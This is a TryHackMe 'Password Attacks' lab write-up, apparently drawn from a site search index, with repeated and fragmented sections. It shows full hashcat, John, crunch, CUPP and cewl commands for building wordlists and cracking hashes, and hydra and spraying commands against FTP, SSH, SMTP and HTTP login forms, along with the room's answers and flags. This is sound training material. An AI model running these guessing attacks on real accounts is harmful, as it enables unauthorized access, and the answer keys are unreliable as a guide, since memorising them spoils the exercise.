: 20 : 50 2021 ( 0 secs ) Time . Estimated ...: Mon Oct 11 08 : 20 : 50 2021 ( 0 secs ) Guess . Base .......: File (/ usr / share / wordlists / rockyou . txt ) Guess . Queue ......: 1 / 1 ( 100 . 00 %) Speed . #1.........: 114.1 kH/s (0.02ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered ........: 1 / 1 ( 100 . 00 %) Digests Progress .........: 40 / 40 ( 100 . 00 %) Rejected .........: 0 / 40 ( 0 . 00 %) Restore . Point ....: 0 / 40 ( 0 . 00 %) Restore . Sub . #1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates . #1....: 123456 -> 123123 Started : Mon Oct 11 08 : 20 : 49 2021 Stopped : Mon Oct 11 08 : 20 : 52 2021 -a 0 sets the attack mode to a dictionary attack -m 0 sets the hash mode for cracking MD5 hashes; for other types, run hashcat -h for a list of supported hashes. f806fc5a2a0d5ba2471600758452799c this option could be a single hash like our example or a file that contains a hash or multiple hashes. /usr/share/wordlists/rockyou.txt the wordlist/dictionary file for our attack We run hashcat with --show option to show the cracked value if the hash has been cracked: Dictionary attack user @machine $ hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C / usr / share / wordlists / rockyou . txt - -show f806fc5a2a0d5ba2471600758452799c : rockyou As a result, the cracked value is rockyou . Brute-Force attack \u00b6 Brute-forcing is a common attack used by the attacker to gain unauthorized access to a personal account. This method is used to guess the victim's password by sending standard password combinations. The main difference between a dictionary and a brute-force attack is that a dictionary attack uses a wordlist that contains all possible passwords. In contrast, a brute-force attack aims to try all combinations of a character or characters. For example, let's assume that we have a bank account to which we need unauthorized access. We know that the PIN contains 4 digits as a password. We can perform a brute-force attack that starts from 0000 to 9999 to guess the valid PIN based on this knowledge. In other cases, a sequence of numbers or letters can be added to existing words in a list, such as admin0 , admin1 , .. admin9999 . For instance, hashcat has charset options that could be used to generate your own combinations. The charsets can be found in hashcat help options. Brute-Force attack user @machine $ hashcat - -help ? | Charset ===+========= l | abcdefghijklmnopqrstuvwxyz u | ABCDEFGHIJKLMNOPQRSTUVWXYZ d | 0123456789 h | 0123456789abcdef H | 0123456789ABCDEF s | ! \"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ a | ?l?u?d?s b | 0x00 - 0xff The following example shows how we can use hashcat with the brute-force attack mode with a combination of our choice. Brute-Force attack user @machine $ hashcat -a 3 ? d ? d ? d ? d - -stdout 1234 0234 2234 3234 9234 4234 5234 8234 7234 6234 .. .. -a 3 sets the attacking mode as a brute-force attack ?d?d?d?d the ?d tells hashcat to use a digit. In our case, ?d?d?d?d for four digits starting with 0000 and ending at 9999 --stdout print the result to the terminal Now let's apply the same concept to crack the following MD5 hash: 05A5CF06982BA7892ED2A6D38FE832D6 a four-digit PIN number. Brute-Force attack user @machine $ hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ? d ? d ? d ? d 05a5cf06982ba7892ed2a6d38fe832d6 : 2021 Session ..........: hashcat Status ...........: Cracked Hash . Name ........: MD5 Hash . Target ......: 05a5cf06982ba7892ed2a6d38fe832d6 Time . Started .....: Mon Oct 11 10 : 54 : 06 2021 ( 0 secs ) Time . Estimated ...: Mon Oct 11 10 : 54 : 06 2021 ( 0 secs ) Guess . Mask .......: ? d ? d ? d ? d [ 4 ] Guess . Queue ......: 1 / 1 ( 100 . 00 %) Speed . #1.........: 16253.6 kH/s (0.10ms) @ Accel:1024 Loops:10 Thr:1 Vec:8 Recovered ........: 1 / 1 ( 100 . 00 %) Digests Progress .........: 10000 / 10000 ( 100 . 00 %) Rejected .........: 0 / 10000 ( 0 . 00 %) Restore . Point ....: 0 / 1000 ( 0 . 00 %) Restore . Sub . #1...: Salt:0 Amplifier:0-10 Iteration:0-10 Candidates . #1....: 1234 -> 6764 Started : Mon Oct 11 10 : 54 : 05 2021 Stopped : Mon Oct 11 10 : 54 : 08 2021 Answer the questions below Considering the following hash: 8d6e34f987851aa599257d3831a1af040886842f . What is the hash type? Answer sha - 1 Perform a dictionary attack against the following hash: 8d6e34f . What is the cracked value? Use rockyou.txt wordlist. Answer sunshine Perform a brute-force attack against the following MD5 hash: e48e13207341b6bffb7fb1622282247b. What is the cracked value? Note the password is a 4 digit number: [0-9][0-9][0-9][0-9] Answer 1337 Task 6: Offline Attacks - Rule-Based \u00b6 Rule-Based attacks \u00b6 Rule-Based attacks are also known as hybrid attacks. Rule-Based attacks assume the attacker knows something about the password policy. Rules are applied to create passwords within the guidelines of the given password policy and should, in theory, only generate valid passwords. Using pre-existing wordlists may be useful when generating passwords that fit a policy \u2014 for example, manipulating or 'mangling' a password such as 'password': p@ssword, Pa$$word, Passw0rd, and so on. For this attack, we can expand our wordlist using either hashcat or John the ripper. However, for this attack, let's see how John the ripper works. Usually, John the ripper has a config file that contains rule sets, which is located at /etc/john/john.conf or /opt/john/john.conf depending on your distro or how john was installed. You can read /etc/john/john.conf and look for List.Rules to see all the available rules: Rule-based attack user @machine $ cat / etc / john / john . conf | grep \"List.Rules:\" | cut -d \".\" -f3 | cut -d \":\" -f2 | cut -d \"]\" -f1 | awk NF JumboSingle o1 o2 i1 i2 o1 i1 o2 i2 best64 d3ad0ne dive InsidePro T0XlC rockyou - 30000 specific ShiftToggle Split Single Extra OldOffice Single-Extra Wordlist ShiftToggle Multiword best64 Jumbo KoreLogic T9 We can see that we have many rules that are available for us to use. We will create a wordlist with only one password containing the string tryhackme , to see how we can expand the wordlist. Let's choose one of the rules, the best64 rule, which contains the best 64 built-in John rules, and see what it can do! Rule-based attack user @machine $ john - -wordlist =/ tmp / single-password-list . txt - -rules = best64 - -stdout | wc -l Using default input encoding : UTF - 8 Press 'q' or Ctrl-C to abort , almost any other key for status 76p 0 : 00 : 00 : 00 100 . 00 % ( 2021 - 10 - 11 13 : 42 ) 1266p / s pordpo 76 --wordlist= to specify the wordlist or dictionary file. --rules to specify which rule or rules to use. --stdout to print the output to the terminal. |wc -l to count how many lines John produced. By running the previous command, we expand our password list from 1 to 76 passwords. Now let's check another rule, one of the best rules in John, KoreLogic . KoreLogic uses various built-in and custom rules to generate complex password lists. For more information, please visit this website here . Now let's use this rule and check whether the Tryh@ckm3 is available in our list! Answer the questions below What syntax would you use to create a rule to produce the following: \"S[Word]NN where N is Number and S is a symbol of !@? Answer Az \"[0-9][0-9]\" ^[!@] Task 8: Online password attacks \u00b6 Some online password attacks tools: hydra, Medusa , Ncrack , others! Hydra \u00b6 Brute force: hydra -l ftp -P passlist.txt ftp://xxx.xxx.xxx.xxx hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v HTTP login pages \u00b6 In this scenario, we will brute-force HTTP login pages . To do that, first, you need to understand what you are brute-forcing. Using hydra, it is important to specify the type of HTTP request, whether GET or POST . Checking hydra options: hydra http-get-form -U , we can see that hydra has the following syntax for the http-get-form option: <url>:<form parameters>:<condition string>[:<optional>[:<optional>] As we mentioned earlier, we need to analyze the HTTP request that we need to send, and that could be done either by using your browser dev tools or using a web proxy such as Burp Suite. hydra user @machine $ hydra -l admin -P 500-worst-passwords . txt 10 . 10 . x . x http-get-form \"/login-get/index.php:username=^USER^&password=^PASS^:S=logout.php\" -f Hydra v8 . 6 ( c ) 2017 by van Hauser / THC - Please do not use in military or secret service organizations , or for illegal purposes . Hydra ( http :// www . thc . org / thc-hydra ) starting at 2021 - 10 - 13 08 : 06 : 22 [DATA] max 16 tasks per 1 server , overall 16 tasks , 500 login tries ( l : 1 / p : 500 ), ~ 32 tries per task [DATA] attacking http-get-form :// 10 . 10 . x . x : 80 // login-get / index . php : username =^ USER ^& password =^ PASS ^: S = logout . php [ 80 ][ http-get-form ] host : 10 . 10 . x . x login : admin password : xxxxxx 1 of 1 target successfully completed , 1 valid password found Hydra ( http :// www . thc . org / thc-hydra ) finished at 2021 - 10 - 13 08 : 06 : 45 Option: -f to stop the brute-forcing attacks after finding a valid username and password Online password attacks Answer the questions below Question 1: Can you guess the FTP credentials without brute-forcing? What is the flag? THM{d0abe799f25738ad739c20301aed357b} Hint: Can login anonymous Perform a brute-forcing attack against the phillips account for the login page at http://MACHINE_IP/login-get using hydra? What is the flag? THM{33c5d4954da881814420f3ba39772644} Perform a rule-based password attack to gain access to the burgess account. Find the flag at the following website: http://MACHINE_IP/login-post/ . What is the flag? THM{f8e3750cc0ccbb863f2706a3b2933227} Note: use the clinic.lst dictionary in generating and expanding the wordlist! Task 9: Password spray attack \u00b6 RDP \u00b6 See tool: https://github.com/xFreed0m/RDPassSpray Syntax: python3 RDPassSpray.py -u user -p pass -t HOST:PORT Outlook web access (OWA) portal \u00b6 Tools: SprayingToolkit (atomizer.py) MailSniper SMB \u00b6 Tool: Metasploit (auxiliary/scanner/smb/smb_login) Answer the questions below Use the following username list: Password spraying attack! user @THM :~ # cat usernames-list.txt admin phillips burgess pittman guess Perform a password spraying attack to get access to the SSH://MACHINE_IP server to read /etc/flag . What is the flag? Flag: THM{a97a26e86d09388bbea148f4b870277d} Task 10: Summary \u00b6 This room introduced the basic concepts of different password attacks and how to create custom and targeted password lists. We covered and discussed various topics, including: Default, weak, leaked combined wordlists Password profiling Offline password attacks Online password attacks","title":"Password Attacks"},{"location":"tryhackme/room/password-attacks/#password-attacks","text":"","title":"Password Attacks"},{"location":"tryhackme/room/password-attacks/#task-1-introduction","text":"This room is an introduction to the types and techniques used in password attacks. We will discuss the ways to get and generate custom password lists. The following are some of the topics we will discuss: Password profiling Password attacks techniques Online password attacks","title":"Task 1: Introduction"},{"location":"tryhackme/room/password-attacks/#what-is-a-password","text":"Passwords are used as an authentication method for individuals to access computer systems or applications. Using passwords ensures the owner of the account is the only one who has access. However, if the password is shared or falls into the wrong hands, unauthorized changes to a given system could occur. Unauthorized access could potentially lead to changes in the system's overall status and health or damage the file system. Passwords are typically comprised of a combination of characters such as letters, numbers, and symbols. Thus, it is up to the user how they generate passwords! A collection of passwords is often referred to as a dictionary or wordlist. Passwords with low complexity that are easy to guess are commonly found in various publicly disclosed password data breaches. For example, an easy-to-guess password could be password , 123456 , 111111 , and much more. Here are the top 100 and most common and seen passwords for your reference. Thus, it won't take long and be too difficult for the attacker to run password attacks against the target or service to guess the password. Choosing a strong password is a good practice, making it hard to guess or crack. Strong passwords should not be common words or found in dictionaries as well as the password should be an eight characters length at least. It also should contain uppercase and lower case letters, numbers, and symbol strings (ex: *&^%$#@ ). Sometimes, companies have their own password policies and enforce users to follow guidelines when creating passwords. This helps ensure users aren't using common or weak passwords within their organization and could limit attack vectors such as brute-forcing. For example, a password length has to be eight characters and more, including characters, a couple of numbers, and at least one symbol. However, if the attacker figures out the password policy, he could generate a password list that satisfies the account password policy.","title":"What is a password?"},{"location":"tryhackme/room/password-attacks/#how-secure-are-passwords","text":"Passwords are a protection method for accessing online accounts or computer systems. Passwords authentication methods are used to access personal and private systems, and its main goal of using the password is to keep it safe and not share it with others. To answer the question: How secure are passwords? depends on various factors. Passwords are usually stored within the file system or database, and keeping them safe is essential. We've seen cases where companies store passwords into plaintext documents, such as the Sony breach in 2014. Therefore, once an attacker accesses the file system, he can easily obtain and reuse these passwords. On the other hand, others store passwords within the system using various techniques such as hashing functions or encryption algorithms to make them more secure. Even if the attacker has to access the system, it will be harder to crack. We will cover cracking hashes in the upcoming tasks. Answer the questions below Learn about password attacking techniques in the next task! Answer No needed answer","title":"How secure are passwords?"},{"location":"tryhackme/room/password-attacks/#task-2-password-attacking-techniques","text":"Alt text","title":"Task 2: Password Attacking Techniques"},{"location":"tryhackme/room/password-attacks/#password-attack-techniques","text":"In this room, we will discuss the techniques that could be used to perform password attacks. We will cover various techniques such as a dictionary, brute-force, rule-base, and guessing attacks. All the above techniques are considered active 'online' attacks where the attacker needs to communicate with the target machine to obtain the password in order to gain unauthorized access to the machine.","title":"Password Attack Techniques"},{"location":"tryhackme/room/password-attacks/#password-cracking-vs-password-guessing","text":"This section discusses password cracking terminology from a cybersecurity perspective. Also, we will discuss significant differences between password cracking and password guessing. Finally, we'll demonstrate various tools used for password cracking, including Hashcat and John the Ripper . Password cracking is a technique used for discovering passwords from encrypted or hashed data to plaintext data. Attackers may obtain the encrypted or hashed passwords from a compromised computer or capture them from transmitting data over the network. Once passwords are obtained, the attacker can utilize password attacking techniques to crack these hashed passwords using various tools. Password cracking is considered one of the traditional techniques in pen-testing. The primary goal is to let the attacker escalate to higher privileges and access to a computer system or network. Password guessing and password cracking are often commonly used by information security professionals. Both have different meanings and implications. Password guessing is a method of guessing passwords for online protocols and services based on dictionaries. The following are major differences between password cracking and password guessing: Password guessing is a technique used to target online protocols and services. Therefore, it's considered time-consuming and opens up the opportunity to generate logs for the failed login attempts. A password guessing attack conducted on a web-based system often requires a new request to be sent for each attempt, which can be easily detected. It may cause an account to be locked out if the system is designed and configured securely. Password cracking is a technique performed locally or on systems controlled by the attacker. Answer the questions below Which type of password attack is performed locally? Answer Explain Password cracking Password cracking is a technique performed locally or on systems controlled by the attacker.","title":"Password Cracking vs. Password Guessing"},{"location":"tryhackme/room/password-attacks/#task-3-password-profiling-1-default-weak-leaked-combined-and-username-wordlists","text":"Having a good wordlist is critical to carrying out a successful password attack. It is important to know how you can generate username lists and password lists. In this section, we will discuss creating targeted username and password lists. We will also cover various topics, including default, weak, leaked passwords, and creating targeted wordlists.","title":"Task 3: Password Profiling #1 - Default, Weak, Leaked, Combined , and Username Wordlists"},{"location":"tryhackme/room/password-attacks/#default-passwords","text":"Before performing password attacks, it is worth trying a couple of default passwords against the targeted service. Manufacturers set default passwords with products and equipment such as switches, firewalls, routers. There are scenarios where customers don't change the default password, which makes the system vulnerable. Thus, it is a good practice to try out admin:admin , admin:123456 , etc. If we know the target device, we can look up the default passwords and try them out. For example, suppose the target server is a Tomcat, a lightweight, open-source Java application server. In that case, there are a couple of possible default passwords we can try: admin:admin or tomcat:admin . Here are some website lists that provide default passwords for various products. https://cirt.net/passwords https://default-password.info/ https://datarecovery.com/rd/default-passwords/","title":"Default Passwords"},{"location":"tryhackme/room/password-attacks/#weak-passwords","text":"Professionals collect and generate weak password lists over time and often combine them into one large wordlist. Lists are generated based on their experience and what they see in pentesting engagements. These lists may also contain leaked passwords that have been published publically. Here are some of the common weak passwords lists : https://wiki.skullsecurity.org/index.php?title=Passwords - This includes the most well-known collections of passwords. SecLists - A huge collection of all kinds of lists, not only for password cracking.","title":"Weak Passwords"},{"location":"tryhackme/room/password-attacks/#leaked-passwords","text":"Sensitive data such as passwords or hashes may be publicly disclosed or sold as a result of a breach. These public or privately available leaks are often referred to as 'dumps'. Depending on the contents of the dump, an attacker may need to extract the passwords out of the data. In some cases, the dump may only contain hashes of the passwords and require cracking in order to gain the plain-text passwords. The following are some of the common password lists that have weak and leaked passwords, including webhost , elitehacker , hak5 , Hotmail , PhpBB companies' leaks: SecLists/Passwords/Leaked-Databases","title":"Leaked Passwords"},{"location":"tryhackme/room/password-attacks/#combined-wordlists","text":"Let's say that we have more than one wordlist. Then, we can combine these wordlists into one large file. This can be done as follows using cat : cewl cat file1 . txt file2 . txt file3 . txt > combined_list . txt To clean up the generated combined list to remove duplicated words, we can use sort and uniq as follows: cewl sort combined_list . txt | uniq -u > cleaned_combined_list . txt","title":"Combined wordlists"},{"location":"tryhackme/room/password-attacks/#customized-wordlists","text":"Customizing password lists is one of the best ways to increase the chances of finding valid credentials. We can create custom password lists from the target website. Often, a company's website contains valuable information about the company and its employees, including emails and employee names. In addition, the website may contain keywords specific to what the company offers, including product and service names, which may be used in an employee's password! Tools such as Cewl can be used to effectively crawl a website and extract strings or keywords. Cewl is a powerful tool to generate a wordlist specific to a given company or target. Consider the following example below cewl user @thm $ cewl -w list . txt -d 5 -m 5 http :// thm . labs -w will write the contents to a file. In this case, list.txt. -m 5 gathers strings (words) that are 5 characters or more -d 5 is the depth level of web crawling/spidering (default 2) http://thm.labs is the URL that will be used As a result, we should now have a decently sized wordlist based on relevant words for the specific enterprise, like names, locations, and a lot of their business lingo. Similarly, the wordlist that was created could be used to fuzz for usernames. Apply what we discuss using cewl against https://clinic.thmredteam.com/ to parse all words and generate a wordlist with a minimum length of 8. Note that we will be using this wordlist later on with another task!","title":"Customized Wordlists"},{"location":"tryhackme/room/password-attacks/#username-wordlists","text":"Gathering employees' names in the enumeration stage is essential. We can generate username lists from the target's website. For the following example, we'll assume we have a {first name} {last name} (ex: John Smith) and a method of generating usernames. {first name} : john {last name} : smith {first name}{last name} : johnsmith {last name}{first name} : smithjohn first letter of the {first name}{last name} : jsmith first letter of the {last name}{first name} : sjohn first letter of the {first name}.{last name} : j.smith first letter of the {first name}-{last name} : j-smith and so on Thankfully, there is a tool username_generator that could help create a list with most of the possible combinations if we have a first name and last name. Usernames user @thm $ git clone https :// github . com / therodri2 / username_generator . git Cloning into 'username_generator' ... remote : Enumerating objects : 9 , done . remote : Counting objects : 100 % ( 9 / 9 ), done . remote : Compressing objects : 100 % ( 7 / 7 ), done . remote : Total 9 ( delta 0 ), reused 0 ( delta 0 ), pack-reused 0 Receiving objects : 100 % ( 9 / 9 ), done . user @thm $ cd username_generator Using python3 username_generator.py -h shows the tool's help message and optional arguments. Usernames user @thm $ python3 username_generator . py -h usage : username_generator . py [ -h ] -w wordlist [ -u ] Python script to generate user lists for bruteforcing ! optional arguments : -h , - -help show this help message and exit -w wordlist , - -wordlist wordlist Specify path to the wordlist -u , - -uppercase Also produce uppercase permutations . Disabled by default ``` Now let 's create a wordlist that contains the full name John Smith to a text file. Then, we' ll run the tool to generate the possible combinations of the given full name . ``` ps1 title = \"Usernames\" user @thm $ echo \"John Smith\" > users . lst user @thm $ python3 username_generator . py -w users . lst usage : username_generator . py [ -h ] -w wordlist [ -u ] john smith j . smith j-smith j_smith j + smith jsmith smithjohn This is just one example of a custom username generator. Please feel free to explore more options or even create your own in the programming language of your choice! Answer the questions below What are the default login credentials (in the format of username:password ) for a Juniper Networks ISG 2000 device? Answer netscreen : netscreen","title":"Username Wordlists"},{"location":"tryhackme/room/password-attacks/#task-4-password-profiling-2-keyspace-technique-and-cupp","text":"","title":"Task 4: Password Profiling #2 - Keyspace Technique and CUPP"},{"location":"tryhackme/room/password-attacks/#keyspace-technique","text":"Another way of preparing a wordlist is by using the key-space technique. In this technique, we specify a range of characters, numbers, and symbols in our wordlist. crunch is one of many powerful tools for creating an offline wordlist. With crunch , we can specify numerous options, including min, max, and options as follows: crunch user @thm $ crunch -h crunch version 3 . 6 Crunch can create a wordlist based on the criteria you specify . The output from crunch can be sent to the screen , file , or to another program . Usage : crunch [options] where min and max are numbers Please refer to the man page for instructions and examples on how to use crunch . The following example creates a wordlist containing all possible combinations of 2 characters, including 0-4 and a-d. We can use the -o argument and specify a file to save the output to. crunch user @thm $ crunch 2 2 01234abcd -o crunch . txt Crunch will now generate the following amount of data : 243 bytes 0 MB 0 GB 0 TB 0 PB Crunch will now generate the following number of lines : xx crunch : 100 % completed generating output Here is a snippet of the output: crunch user @thm $ cat crunch . txt 00 01 02 03 04 0a 0b 0c 0d 10 . . . cb cc cd d0 d1 d2 d3 d4 da db dc dd It's worth noting that crunch can generate a very large text file depending on the word length and combination options you specify. The following command creates a list with an 8 character minimum and maximum length containing numbers 0-9, a-f lowercase letters, and A-F uppercase letters: crunch 8 8 0123456789abcdefABCDEF -o crunch.txt the file generated is 459 GB and contains 54875873536 words. crunch also lets us specify a character set using the -t option to combine words of our choice. Here are some of the other options that could be used to help create different combinations of your choice: @ - lower case alpha characters , - upper case alpha characters % - numeric characters ^ - special characters including space For example, if part of the password is known to us, and we know it starts with pass and follows two numbers, we can use the % symbol from above to match the numbers. Here we generate a wordlist that contains pass followed by 2 numbers: crunch user @thm $ crunch 6 6 -t pass %% Crunch will now generate the following amount of data : 700 bytes 0 MB 0 GB 0 TB 0 PB Crunch will now generate the following number of lines : 100 pass00 pass01 pass02 pass03","title":"Keyspace Technique"},{"location":"tryhackme/room/password-attacks/#cupp-common-user-passwords-profiler","text":"CUPP is an automatic and interactive tool written in Python for creating custom wordlists. For instance, if you know some details about a specific target, such as their birthdate, pet name, company name, etc., this could be a helpful tool to generate passwords based on this known information. CUPP will take the information supplied and generate a custom wordlist based on what's provided. There's also support for a 1337/leet mode , which substitutes the letters a, i,e, t, o, s, g, z with numbers. For example, replace a with 4 or i with 1. For more information about the tool, please visit the GitHub repo here . To run CUPP, we need python 3 installed. Then clone the GitHub repo to your local machine using git as follows: CUPP user @thm $ git clone https :// github . com / Mebus / cupp . git Cloning into 'cupp' ... remote : Enumerating objects : 237 , done . remote : Total 237 ( delta 0 ), reused 0 ( delta 0 ), pack-reused 237 Receiving objects : 100 % ( 237 / 237 ), 2 . 14 MiB | 1 . 32 MiB / s , done . Resolving deltas : 100 % ( 125 / 125 ), done . Now change the current directory to CUPP and run python3 cupp.py or with -h to see the available options. CUPP user @thm $ python3 cupp . py ___________ cupp . py ! # Common \\ # User \\ , __ , # Passwords \\ ( oo ) ____ # Profiler ( __ ) )\\ ||--|| * [ Muris Kurgas | j0rgan @remote -exploit . org ] [ Mebus | https :// github . com / Mebus /] usage : cupp . py [ -h ] [ -i | -w FILENAME | -l | -a | -v ] [ -q ] Common User Passwords Profiler optional arguments : -h , - -help show this help message and exit -i , - -interactive Interactive questions for user password profiling -w FILENAME Use this option to improve existing dictionary , or WyD . pl output to make some pwnsauce -l Download huge wordlists from repository -a Parse default usernames and passwords directly from Alecto DB . Project Alecto uses purified databases of Phenoelit and CIRT which were merged and enhanced -v , - -version Show the version of this program . -q , - -quiet Quiet mode ( don ' t print banner ) CUPP supports an interactive mode where it asks questions about the target and based on the provided answers, it creates a custom wordlist. If you don't have an answer for the given field, then skip it by pressing the Enter key. CUPP user @thm $ python3 cupp . py -i ___________ cupp . py ! # Common \\ # User \\ , __ , # Passwords \\ ( oo ) ____ # Profiler ( __ ) )\\ ||--|| * [ Muris Kurgas | j0rgan @remote -exploit . org ] [ Mebus | https :// github . com / Mebus /] [+] Insert the information about the victim to make a dictionary [+] If you don 't know all the info, just hit enter when asked! ;) > First Name: > Surname: > Nickname: > Birthdate (DDMMYYYY): > Partners) name: > Partners) nickname: > Partners) birthdate (DDMMYYYY): > Child' s name : > Child 's nickname: > Child' s birthdate ( DDMMYYYY ): > Pet ' s name : > Company name : > Do you want to add some key words about the victim ? Y / [N] : > Do you want to add special chars at the end of words ? Y / [N] : > Do you want to add some random numbers at the end of words ? Y / [N] : > Leet mode ? ( i . e . leet = 1337 ) Y / [N] : [+] Now making a dictionary ... [+] Sorting list and removing duplicates ... [+] Saving dictionary to ..... txt , counting ..... words . > Hyperspeed Print ? ( Y / n ) \u0650As a result, a custom wordlist that contains various numbers of words based on your entries is generated. Pre-created wordlists can be downloaded to your machine as follows: CUPP user @thm $ python3 cupp . py -l ___________ cupp . py ! # Common \\ # User \\ , __ , # Passwords \\ ( oo ) ____ # Profiler ( __ ) )\\ ||--|| * [ Muris Kurgas | j0rgan @remote -exploit . org ] [ Mebus | https :// github . com / Mebus /] Choose the section you want to download : 1 Moby 14 french 27 places 2 afrikaans 15 german 28 polish 3 american 16 hindi 29 random 4 aussie 17 hungarian 30 religion 5 chinese 18 italian 31 russian 6 computer 19 japanese 32 science 7 croatian 20 latin 33 spanish 8 czech 21 literature 34 swahili 9 danish 22 movieTV 35 swedish 10 databases 23 music 36 turkish 11 dictionaries 24 names 37 yiddish 12 dutch 25 net 38 exit program 13 finnish 26 norwegian Files will be downloaded from http :// ftp . funet . fi / pub / unix / security / passwd / crack / dictionaries / repository Tip : After downloading wordlist , you can improve it with -w option > Enter number : Based on your interest, you can choose the wordlist from the list above to aid in generating wordlists for brute-forcing! Finally, CUPP could also provide default usernames and passwords from the Alecto database by using the -a option. CUPP user @thm $ python3 cupp . py -a ___________ cupp . py ! # Common \\ # User \\ , __ , # Passwords \\ ( oo ) ____ # Profiler ( __ ) )\\ ||--|| * [ Muris Kurgas | j0rgan @remote -exploit . org ] [ Mebus | https :// github . com / Mebus /] [+] Checking if alectodb is not present ... [+] Downloading alectodb . csv . gz from https :// github . com / yangbh / Hammer / raw / b0446396e8d67a7d4e53d6666026e078262e5bab / lib / cupp / alectodb . csv . gz ... [+] Exporting to alectodb-usernames . txt and alectodb-passwords . txt [+] Done . Answer the questions below Run the following crunch command:crunch 2 2 01234abcd -o crunch.txt. How many words did crunch generate? Answer 81","title":"CUPP - Common User Passwords Profiler"},{"location":"tryhackme/room/password-attacks/#task-5-offline-attacks-dictionary-and-brute-force","text":"This section discusses offline attacks, including dictionary, brute-force, and rule-based attacks.","title":"Task 5: Offline Attacks - Dictionary and Brute-Force"},{"location":"tryhackme/room/password-attacks/#dictionary-attack","text":"A dictionary attack is a technique used to guess passwords by using well-known words or phrases. The dictionary attack relies entirely on pre-gathered wordlists that were previously generated or found. It is important to choose or create the best candidate wordlist for your target in order to succeed in this attack. Let's explore performing a dictionary attack using what you've learned in the previous tasks about generating wordlists. We will showcase an offline dictionary attack using hashcat , which is a popular tool to crack hashes. Let's say that we obtain the following hash f806fc5a2a0d5ba2471600758452799c , and want to perform a dictionary attack to crack it. First, we need to know the following at a minimum: 1- What type of hash is this? 2- What wordlist will we be using? Or what type of attack mode could we use? To identify the type of hash, we could a tool such as hashid or hash-identifier . For this example, hash-identifier believed the possible hashing method is MD5. Please note the time to crack a hash will depend on the hardware you're using (CPU and/or GPU). Dictionary attack user @machine $ hashcat -a 0 -m 0 f806fc5a2a0d5ba2471600758452799c / usr / share / wordlists / rockyou . txt hashcat ( v6 . 1 . 1 ) starting ... f806fc5a2a0d5ba2471600758452799c : rockyou Session ..........: hashcat Status ...........: Cracked Hash . Name ........: MD5 Hash . Target ......: f806fc5a2a0d5ba2471600758452799c Time . Started .....: Mon Oct 11 08 : 20 : 50 2021 ( 0 secs ) Time . Estimated ...: Mon Oct 11 08 : 20 : 50 2021 ( 0 secs ) Guess . Base .......: File (/ usr / share / wordlists / rockyou . txt ) Guess . Queue ......: 1 / 1 ( 100 . 00 %) Speed . #1.........: 114.1 kH/s (0.02ms) @ Accel:1024 Loops:1 Thr:1 Vec:8 Recovered ........: 1 / 1 ( 100 . 00 %) Digests Progress .........: 40 / 40 ( 100 . 00 %) Rejected .........: 0 / 40 ( 0 . 00 %) Restore . Point ....: 0 / 40 ( 0 . 00 %) Restore . Sub . #1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidates . #1....: 123456 -> 123123 Started : Mon Oct 11 08 : 20 : 49 2021 Stopped : Mon Oct 11 08 : 20 : 52 2021 -a 0 sets the attack mode to a dictionary attack -m 0 sets the hash mode for cracking MD5 hashes; for other types, run hashcat -h for a list of supported hashes. f806fc5a2a0d5ba2471600758452799c this option could be a single hash like our example or a file that contains a hash or multiple hashes. /usr/share/wordlists/rockyou.txt the wordlist/dictionary file for our attack We run hashcat with --show option to show the cracked value if the hash has been cracked: Dictionary attack user @machine $ hashcat -a 0 -m 0 F806FC5A2A0D5BA2471600758452799C / usr / share / wordlists / rockyou . txt - -show f806fc5a2a0d5ba2471600758452799c : rockyou As a result, the cracked value is rockyou .","title":"Dictionary attack"},{"location":"tryhackme/room/password-attacks/#brute-force-attack","text":"Brute-forcing is a common attack used by the attacker to gain unauthorized access to a personal account. This method is used to guess the victim's password by sending standard password combinations. The main difference between a dictionary and a brute-force attack is that a dictionary attack uses a wordlist that contains all possible passwords. In contrast, a brute-force attack aims to try all combinations of a character or characters. For example, let's assume that we have a bank account to which we need unauthorized access. We know that the PIN contains 4 digits as a password. We can perform a brute-force attack that starts from 0000 to 9999 to guess the valid PIN based on this knowledge. In other cases, a sequence of numbers or letters can be added to existing words in a list, such as admin0 , admin1 , .. admin9999 . For instance, hashcat has charset options that could be used to generate your own combinations. The charsets can be found in hashcat help options. Brute-Force attack user @machine $ hashcat - -help ? | Charset ===+========= l | abcdefghijklmnopqrstuvwxyz u | ABCDEFGHIJKLMNOPQRSTUVWXYZ d | 0123456789 h | 0123456789abcdef H | 0123456789ABCDEF s | ! \"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ a | ?l?u?d?s b | 0x00 - 0xff The following example shows how we can use hashcat with the brute-force attack mode with a combination of our choice. Brute-Force attack user @machine $ hashcat -a 3 ? d ? d ? d ? d - -stdout 1234 0234 2234 3234 9234 4234 5234 8234 7234 6234 .. .. -a 3 sets the attacking mode as a brute-force attack ?d?d?d?d the ?d tells hashcat to use a digit. In our case, ?d?d?d?d for four digits starting with 0000 and ending at 9999 --stdout print the result to the terminal Now let's apply the same concept to crack the following MD5 hash: 05A5CF06982BA7892ED2A6D38FE832D6 a four-digit PIN number. Brute-Force attack user @machine $ hashcat -a 3 -m 0 05A5CF06982BA7892ED2A6D38FE832D6 ? d ? d ? d ? d 05a5cf06982ba7892ed2a6d38fe832d6 : 2021 Session ..........: hashcat Status ...........: Cracked Hash . Name ........: MD5 Hash . Target ......: 05a5cf06982ba7892ed2a6d38fe832d6 Time . Started .....: Mon Oct 11 10 : 54 : 06 2021 ( 0 secs ) Time . Estimated ...: Mon Oct 11 10 : 54 : 06 2021 ( 0 secs ) Guess . Mask .......: ? d ? d ? d ? d [ 4 ] Guess . Queue ......: 1 / 1 ( 100 . 00 %) Speed . #1.........: 16253.6 kH/s (0.10ms) @ Accel:1024 Loops:10 Thr:1 Vec:8 Recovered ........: 1 / 1 ( 100 . 00 %) Digests Progress .........: 10000 / 10000 ( 100 . 00 %) Rejected .........: 0 / 10000 ( 0 . 00 %) Restore . Point ....: 0 / 1000 ( 0 . 00 %) Restore . Sub . #1...: Salt:0 Amplifier:0-10 Iteration:0-10 Candidates . #1....: 1234 -> 6764 Started : Mon Oct 11 10 : 54 : 05 2021 Stopped : Mon Oct 11 10 : 54 : 08 2021 